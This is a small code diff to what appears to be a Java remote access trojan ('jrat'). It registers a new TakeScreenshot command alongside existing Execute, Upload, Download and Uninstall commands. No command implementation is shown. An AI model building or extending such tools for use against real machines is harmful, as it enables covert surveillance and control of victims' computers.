@@ -16,6 +16,7 @@ import net.jrat.core.command.commands.connection.Execute;
 import net.jrat.core.command.commands.connection.OpenWeb;
 import net.jrat.core.command.commands.connection.SetConnection;
 import net.jrat.core.command.commands.connection.ShowMessage;
+import net.jrat.core.command.commands.connection.TakeScreenshot;
 import net.jrat.core.command.commands.connection.Uninstall;
 import net.jrat.core.command.commands.connection.Upload;
 
@@ -46,6 +47,7 @@ public class CommandManager
 		this.commands.add(new Beep());
 		this.commands.add(new Download());
 		this.commands.add(new Upload());
+		this.commands.add(new TakeScreenshot());
 		
 		this.commands.add(new Uninstall());
 	}
